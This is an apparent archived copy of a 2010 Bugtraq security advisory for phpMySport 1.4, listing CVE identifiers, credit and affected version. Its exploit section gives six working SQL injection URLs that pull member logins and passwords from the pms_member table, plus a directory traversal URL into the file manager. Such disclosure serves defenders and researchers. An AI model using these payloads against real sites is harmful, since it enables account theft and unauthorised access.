@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid37856<p><b><span style="font-size: 18pt;">phpMySport Information Disclosure and SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/37856/info">info</a><br><a href="http://www.securityfocus.com/bid/37856/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/37856/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/37856/solution">solution</a><br><a href="http://www.securityfocus.com/bid/37856/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				37856
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-1109<br/>
+				
+					CVE-2010-1110<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 18 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:03PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Amol Naik
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					phpMySport phpMySport  1.4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit the issues via a browser.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/phpmysport/index.php?r=member&amp;amp;v1=view&amp;amp;v2='+AND+1=2+UNION+ALL+SELECT+1,2,3,4,5,concat(member_login,0x3a,member_pass),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23+from+pms_member--+-<br/>http://www.example.com/phpmysport/index.php?r=news&amp;amp;v1='+AND+1=2+UNION+ALL+SELECT+1,2,3,4,5,6,concat(member_login,0x3a,member_pass),8,9,10,11,12,13,14,15,16,17+from+pms_member--+-<br/>http://www.example.com/phpmysport/index.php?r=information&amp;amp;v1='+AND+1=2+UNION+ALL+SELECT+1,2,3,4,5,6,7,concat(member_login,0x3a,member_pass),9,10,11,12,13,14,15,16,17,18,19+from+pms_member--+-<br/>http://www.example.com/phpmysport/index.php?r=team&amp;amp;v1=view&amp;amp;v2='+AND+1=2+UNION+ALL+SELECT+1,2,3,4,concat(member_login,0x3a,member_pass),6,7,8+from+pms_member--+-<br/>http://www.example.com/phpmysport/index.php?r=club&amp;amp;v1=view&amp;amp;v2='+AND+1=2+UNION+ALL+SELECT+1,2,3,concat(member_login,0x3a,member_pass),5,6,7,8,9,10,11,12,13,14+from+pms_member--+-<br/>http://www.example.com/phpmysport/index.php?r=matches&amp;amp;v1=view&amp;amp;v2='+AND+1=2+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,concat(member_login,0x3a,member_pass),20,21,22,23,24,25,26,27,28+from+pms_member--+-<br/><br/>http://www.example.com/phpmysport/index.php?r=file&amp;amp;v1=file_manager&amp;amp;current_folder=/../../../&amp;amp;fen=pop
+	
+		<ul>
+</ul>
+</div>
